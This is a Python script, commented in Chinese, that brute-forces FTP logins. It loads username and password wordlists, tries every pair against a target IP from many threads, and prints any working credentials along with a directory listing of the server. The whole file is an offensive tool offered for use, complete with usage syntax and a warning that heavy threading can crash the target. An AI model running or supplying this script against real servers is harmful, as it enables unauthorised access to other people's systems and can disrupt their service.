import ftplib
import  sys
import threading
import queue
from lib.choose import UseStyle


# 多线程
def Thread(ip,port,quantity):
    Thread=queue.Queue()
    for username in open('./blasting/ftp_blasting/user.txt'):
        for password in open('./blasting/ftp_blasting/passwd.txt'):
            username = username.replace('\n', '')
            password = password.replace('\n', '')
            diclist=username+'|'+password
            Thread.put(diclist)
    for i in  range(int(quantity)):# 定义线程数
        Threads=threading.Thread(target=Log_in,args=(Thread,ip,port,))
        Threads.start()




# 破解
def Log_in(Thread,ip,port):
    while not Thread.empty():
        user_passwd=Thread.get()
        user_passwd=user_passwd.split('|')

        try:
            try:
                ftp=ftplib.FTP() #
                ftp.connect(str(ip),int(port))# 连接的目标ip和端口

                ftp.login(user_passwd[0],user_passwd[1]) # 输入密码

                print("破解成功正确：用户是"+user_passwd[0]+"密码是："+user_passwd[1])
                print(ftp.retrlines('list'))
                ftp.close()


            except ConnectionRefusedError:
                print("连接被拒绝\n*可能对方没有开启FTP服务\n*或者你的地址和端口错误")
                break
        except ftplib.error_perm:
            ftp.close()
            # 原位输出
            print('\r' + str(UseStyle("密码错误=====",fore='yellow')+f"用户：{UseStyle(user_passwd[0],fore='red')}"+f"密码: {UseStyle(user_passwd[1],fore='red')}"), end='', flush=True)


def enter():
    print("""
         _____ _____ ____  
        |  ___|_   _|  _ \ 
        | |_    | | | |_) |
        |  _|   | | |  __/ 
        |_|     |_| |_|    
                                FTP服务器的爆破
    注意：发生请求过多可能会对目标服务器扫挂，尽量不要太多线程
    语法：python 文件名.py [ip] [端口] [线程数量]
    """)
    ip=sys.argv[1]
    port=sys.argv[2]
    quantity=sys.argv[3]

def fill_in(ip,port,quantity):
    if port==None or port=='':
        port=21
    if quantity==None or quantity=='':
        quantity=1

    print("默认线程数是"+str(quantity)+"端口是"+str(port))
    print("现在扫描的是"+UseStyle((ip+ "端口是" + str(port)),mode='underline',fore='red'))
    Thread(ip,21,quantity)
